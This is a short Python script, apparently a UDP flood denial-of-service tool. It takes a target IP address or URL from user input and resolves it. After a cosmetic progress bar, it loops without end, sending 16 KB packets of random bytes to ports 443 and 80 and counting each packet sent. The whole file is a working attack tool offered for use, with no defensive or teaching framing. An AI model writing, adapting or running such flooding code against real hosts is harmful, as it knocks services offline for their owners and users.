import sys
import os
import time
import socket
import random
from datetime import datetime

def is_valid_ip(ip):
    parts = ip.split(".")
    if len(parts) != 4:
        return False
    for item in parts:
        if not 0 <= int(item) <= 255:
            return False
    return True

def get_ip_address(url):
    try:
        # 将主机名转换为IP地址
        ip_address = socket.gethostbyname(url)
        return ip_address
    except socket.gaierror as e:
        # 如果转换失败，打印错误信息
        return f"Fail to get IP: {e}"

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(16384)

target = input("IP or URL: ")
ip = target if is_valid_ip(target) else get_ip_address(target)
# port = int(input("Port       : "))
if "Fail to get IP" in ip:
    print(ip)
    sys.exit()


total_length = 20
total_percent = 100
percent_per_symbol = total_percent / total_length

for i in range(total_length + 1):
    current_percent = i * percent_per_symbol
    equals = "=" * i
    spaces = " " * (total_length - i)
    print(f"[{equals}{spaces}] {current_percent:.0f}% ", end='\r', flush=True)
    time.sleep(0.1)

print(f"[{'=' * total_length}] 100% Start", flush=True)


sent = 0
while True:
  port = 443
  sock.sendto(bytes, (ip,port))
  sock.connect((ip, port))
  sock.sendall(bytes)
  sent = sent + 1
  print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
  port = 80
  sock.sendto(bytes, (ip,port))
  sock.connect((ip, port))
  sock.sendall(bytes)
  sent = sent + 1
  # port = port + 1
  print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
  # if port == 65534:
  #   port = 1
